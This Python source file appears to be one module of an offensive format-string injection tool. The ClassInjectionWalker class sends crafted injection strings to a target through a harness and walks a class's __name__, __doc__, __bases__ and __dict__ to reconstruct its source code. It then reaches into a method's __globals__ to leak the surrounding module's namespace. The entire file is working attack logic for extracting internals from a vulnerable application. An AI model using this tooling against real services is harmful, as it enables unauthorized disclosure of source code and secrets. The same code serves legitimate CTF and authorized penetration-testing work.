"""Implementation of ClassInjectionWalker."""

from __future__ import annotations

from typing import (
    Iterator,
    List,
    Optional,
    Set)

from .abstract_injection_walker import (
    AbstractInjectionWalker)
from .attribute_injection_walker import (
    AttributeInjectionWalker)
from .doc_string_injection_walker import (
    DocStringInjectionWalker)
from .failed_injection_walker import (
    FailedInjectionWalker)
from .function_injection_walker import (
    FunctionInjectionWalker)
from .module_injection_walker import (
    ModuleInjectionWalker)
from .name_injection_walker import (
    NameInjectionWalker)
from ..utils import (
    indent_lines,
    parse_dict_top_level_keys)


class ClassInjectionWalker(AbstractInjectionWalker):
    """An injection walker for recovering class source code and other data."""

    INJECTION_RE = None
    RESPONSE_RE = r'^<class .+>'

    def __extra_init__(
        self
    ) -> None:
        super().__extra_init__()
        self._raw_dict_str: Optional[str] = None

        self._docstring_walker = self.empty_instance(DocStringInjectionWalker)
        self._name_walker = self.empty_instance(NameInjectionWalker)
        self._base_class_walkers: List[ClassInjectionWalker] = []
        self._attribute_walkers: List[AttributeInjectionWalker] = []
        self._function_walkers: List[FunctionInjectionWalker] = []

        self._src_code: Optional[str] = None

    def walk(
        self
    ) -> Iterator[AbstractInjectionWalker]:
        yield from self._walk_name()
        yield from self._walk_doc()
        yield from self._walk_base_classes()
        yield from self._walk_dict()

        self._gen_src_code()
        yield self

        yield from self._walk_globals()

    def _walk_name(
        self
    ) -> Iterator[AbstractInjectionWalker]:
        """Recover the class's __name__."""
        name_injection = f'{self._injection_str}.__name__!r'
        result = self._harness.send_injection(name_injection)
        if result is None:
            yield FailedInjectionWalker.msg(
                f'Unable to read response from injection {name_injection}')
            return

        walker = self.next_walker(name_injection, result)
        if not isinstance(walker, NameInjectionWalker):
            yield FailedInjectionWalker.msg(
                f'Expected a name response when sending {name_injection}; '
                f'got {walker.__class__.__qualname__} instead')
            return

        yield from walker.walk()

        self._name_walker = walker
        if not walker.is_default:
            self._engine.class_blacklist.add(walker.value)

    def _walk_doc(
        self
    ) -> Iterator[AbstractInjectionWalker]:
        """Recover the class's __doc__."""
        docstring_injection = f'{self._injection_str}.__doc__!r'
        result = self._harness.send_injection(docstring_injection)
        if result is None:
            yield FailedInjectionWalker.msg(
                'Unable to retrieve injection response from string '
                f'{docstring_injection}')
            return

        walker = self.next_walker(docstring_injection, result)
        if not isinstance(walker, DocStringInjectionWalker):
            yield FailedInjectionWalker.msg(
                'Expected a docstring response when sending injection '
                f'{docstring_injection}; got '
                f'{walker.__class__.__qualname__} instead')
            return

        yield from walker.walk()
        self._docstring_walker = walker

    def _walk_base_classes(
        self
    ) -> Iterator[AbstractInjectionWalker]:
        """Walk the class's base classes via __bases__."""
        base_classes_injection = f'{self._injection_str}.__bases__'
        result = self._harness.send_injection(base_classes_injection)
        if result is None:
            yield FailedInjectionWalker.msg(
                'Unable to retrieve injection response from string '
                f'{base_classes_injection}')
            return

        i = 0
        while True:
            base_class_indexed_injection = (
                f'{self._injection_str}.__bases__[{i}]')
            result = self._harness.send_injection(base_class_indexed_injection)
            if result is None:
                break

            base_class_walker = self.next_walker(
                base_class_indexed_injection, result)
            if not isinstance(base_class_walker, ClassInjectionWalker):
                yield FailedInjectionWalker.msg(
                    'Expected class injection walker from response but got '
                    f'{base_class_walker.__class__.__qualname__} instead')
                return

            base_class_name_injection = (
                f'{base_class_indexed_injection}.__name__!r')
            result = self._harness.send_injection(base_class_name_injection)
            if result is None:
                break

            base_class_name_walker = self.next_walker(
                base_class_name_injection, result)
            if not isinstance(base_class_name_walker, NameInjectionWalker):
                yield FailedInjectionWalker.msg(
                    'Expected name injection walker from injection '
                    f'{base_class_name_injection} but got'
                    f'{base_class_name_walker.__class__.__qualname__} instead')
                return

            yield from base_class_name_walker.walk()

            base_class_name = base_class_name_walker.value
            if (base_class_name is None or
                    base_class_name in self._engine.class_blacklist):
                i += 1
                continue

            yield from base_class_walker.walk()
            self._base_class_walkers.append(base_class_walker)
            i += 1

    def _walk_dict(
        self
    ) -> Iterator[AbstractInjectionWalker]:
        """Walk the class's attrs, funcs, and other fields via __dict__."""
        key_blacklist: Set[str] = set(self._engine.attribute_blacklist)
        # below fields are visited manually
        key_blacklist |= {'__name__', '__doc__', '__bases__', '__dict__'}

        dict_injection = f'{self._injection_str}.__dict__'
        result = self._harness.send_injection(dict_injection)
        if result is None:
            yield FailedInjectionWalker.msg(
                'Unable to recover __dict__ from class with '
                f'injection {dict_injection}')
            return
        self._raw_dict_str = result

        # now that we have the top-level __dict__ keys, we will iterate over
        # them and inspect any interesting attributes that we get back
        top_level_keys = parse_dict_top_level_keys(self._raw_dict_str)
        for key in top_level_keys:
            if key in key_blacklist:
                continue

            injection_str = f'{self._injection_str}.{key}!r'
            result = self._harness.send_injection(injection_str)
            if result is None:
                yield FailedInjectionWalker.msg(
                    'Unable to read injection response with string '
                    f'{injection_str}')
                continue

            snipped_injection_str = injection_str.rstrip('!r')
            next_walker = self.next_walker(snipped_injection_str, result)
            if next_walker is None:
                next_walker = AttributeInjectionWalker(
                    self._harness,
                    snipped_injection_str,
                    result,
                    self._bytecode_version,
                    self._engine)

            yield from next_walker.walk()

            if isinstance(next_walker, FunctionInjectionWalker):
                self._function_walkers.append(next_walker)
            elif isinstance(next_walker, AttributeInjectionWalker):
                self._attribute_walkers.append(next_walker)

    def _gen_src_code(
        self
    ) -> None:
        """Populate this class's :data:`src_code` attribute."""
        cls_name = self._name_walker.value

        self._src_code = 'class '
        if cls_name is None:
            self._src_code += '<UNKNOWN>'
        else:
            self._src_code += cls_name

        base_cls_names = [
            base_cls_walker.name_walker.value for
            base_cls_walker in self._base_class_walkers if
            base_cls_walker.name_walker is not None and
            base_cls_walker.name_walker.value is not None]
        self._src_code += '('
        self._src_code += ', '.join(base_cls_names)
        self._src_code += '):\n'

        doc_string = self._docstring_walker.value
        self._src_code += f'    """{doc_string}"""\n\n'

        for attr_walker in self._attribute_walkers:
            self._src_code += f'    {attr_walker.name} = {attr_walker.value}\n'

        for func_walker in self._function_walkers:
            if func_walker.src_code is not None:
                self._src_code += f'\n{indent_lines(func_walker.src_code)}\n'

    def _walk_globals(
        self
    ) -> Iterator[AbstractInjectionWalker]:
        """Walk the __globals__ dict, escaping into the above module."""
        if not self._function_walkers:
            return

        # any of our function walkers should give us access to __globals__
        func_walker: FunctionInjectionWalker = self._function_walkers[-1]
        globals_injection_str = (
            f'{func_walker.injection_str.rstrip("!r")}.__globals__')
        result = self._harness.send_injection(globals_injection_str)
        if result is None:
            yield FailedInjectionWalker.msg(
                'Unable to recover injection response with string '
                f'{globals_injection_str}')
            return

        top_level_dict_keys = parse_dict_top_level_keys(result)
        if not top_level_dict_keys:
            yield FailedInjectionWalker.msg(
                'Expected dump of global namespace as dict, but got '
                f'{top_level_dict_keys} instead')
            return

        module_injection_walker = ModuleInjectionWalker(
            self._harness,
            globals_injection_str,
            result,
            self._bytecode_version,
            self._engine)
        yield from module_injection_walker.walk()

    @property
    def raw_dict_str(
        self
    ) -> Optional[str]:
        """The raw __dict__ injection response for the injected class."""
        return self._raw_dict_str

    @property
    def docstring_walker(
        self
    ) -> DocStringInjectionWalker:
        """The walker used to recover the injected class's docstring."""
        return self._docstring_walker

    @property
    def name_walker(
        self
    ) -> NameInjectionWalker:
        """The walker used to recover the injected class's __name__."""
        return self._name_walker

    @property
    def base_class_walkers(
        self
    ) -> List[ClassInjectionWalker]:
        """The walkers used to enumerate this class's bases."""
        return self._base_class_walkers

    @property
    def attribute_walkers(
        self
    ) -> List[AttributeInjectionWalker]:
        """The walkers used to recover this class's attributes."""
        return self._attribute_walkers

    @property
    def function_walkers(
        self
    ) -> List[FunctionInjectionWalker]:
        """The walkers used to recover this class's functions."""
        return self._function_walkers

    @property
    def src_code(
        self
    ) -> Optional[str]:
        """The recovered source code from the injected class."""
        return self._src_code

    def __str__(
        self
    ) -> str:
        return f'Injected class with string {self._injection_str}'
